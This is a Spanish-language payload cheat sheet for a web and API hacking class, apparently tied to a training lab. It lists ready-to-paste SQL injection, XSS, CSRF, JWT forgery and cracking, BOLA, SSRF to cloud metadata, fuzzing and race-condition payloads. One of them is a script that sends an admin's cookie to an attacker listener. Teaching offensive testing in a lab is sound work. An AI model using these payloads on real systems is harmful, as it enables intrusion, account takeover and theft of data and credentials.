# Chuleta de payloads — Ataques Web y API

> Referencia rápida para la Clase 05. Pégalos en Burp Repeater o en `curl`.
> **Solo contra el laboratorio o alcance autorizado.**

## Inyección SQL
```
admin'-- -                      ← bypass de login (comenta el resto)
' OR '1'='1'-- -                ← bypass clásico
1001 AND 1=1   /   1001 AND 1=2 ← prueba booleana (aparece / desaparece)
0 UNION SELECT username,role,password FROM users-- -   ← extracción por UNION
1001'                           ← provoca error (revela el motor: mala config)
```
sqlmap (cuando ya la entiendes a mano):
```bash
sqlmap -u "http://10.50.0.10:5000/factura?id=1001" -p id --batch --dump -T users
```

## XSS / HTML injection
```html
<script>alert(document.domain)</script>         ← prueba básica
<img src=x onerror=alert(1)>                     ← si filtran <script>
<svg onload=alert(1)>                            ← otra vía sin <script>
<script>new Image().src='http://10.50.0.1:8000/x?c='+document.cookie</script>   ← robo de cookie del admin (bandera 33)
   # 1) python3 -m http.server 8000 en tu Kali   2) publica el comentario   3) espera ~8s
   # 4) curl http://10.50.0.10:5000/admin/trofeo -b "token=EL-ROBADO"
<h1>Mantenimiento</h1><form action=http://TU-KALI:8000>...</form>           ← HTML injection
```

## CSRF (página que dispara una acción con la sesión de la víctima)
```html
<form action="http://10.50.0.10:5000/perfil" method="POST">
  <input type=hidden name=email value=atacante@malo.com></form>
<script>document.forms[0].submit()</script>
```

## JWT
```bash
# alg:none (sin firma)
H=$(printf '{"alg":"none","typ":"JWT"}'|base64 -w0|tr '+/' '-_'|tr -d '=')
P=$(printf '{"uid":1,"role":"admin"}'|base64 -w0|tr '+/' '-_'|tr -d '=')
echo "$H.$P."
# crackear secreto HS256
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
jwt_tool jwt.txt -C -d /usr/share/wordlists/rockyou.txt
```

## API (BOLA / BFLA / mass assignment / exposición)
```bash
curl http://10.50.0.10:5000/api/invoices/1002            # IDOR/BOLA: id ajeno
curl http://10.50.0.10:5000/api/users/2                  # exposición excesiva
curl http://10.50.0.10:5000/api/admin/flag -b "token=$TOK"   # BFLA con token de usuario
curl -X POST http://10.50.0.10:5000/registro --data "username=x&password=x&role=admin"  # mass assignment
```

## SSRF
```bash
curl "http://10.50.0.10:5000/api/fetch?url=http://127.0.0.1:5000/interno/metadata"
curl "http://10.50.0.10:5000/api/fetch?url=http://169.254.169.254/latest/meta-data/"   # nube real
```

## Fuzzing
```bash
ffuf -u http://10.50.0.10:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,403
ffuf -u "http://10.50.0.10:5000/factura?id=FUZZ" -w ids.txt -fs 0      # fuzz de ids
```

## Race condition (muchas peticiones a la vez)
```bash
for i in $(seq 1 20); do curl -s URL -b "token=$TOK" -d '...' & done; wait
# En Burp: Turbo Intruder (single-packet attack) o "send group in parallel".
```

## Proxies de intercepción — atajos
| Acción | Burp | Caido | ZAP |
|---|---|---|---|
| Ver historial | Proxy→HTTP history | Traffic | Sites / History |
| Reenviar/editar | Repeater (Ctrl+R) | Replay | Request Editor |
| Fuerza/fuzz | Intruder | Automate | Fuzzer |
| Escáner auto | (Pro) | — | Active Scan |
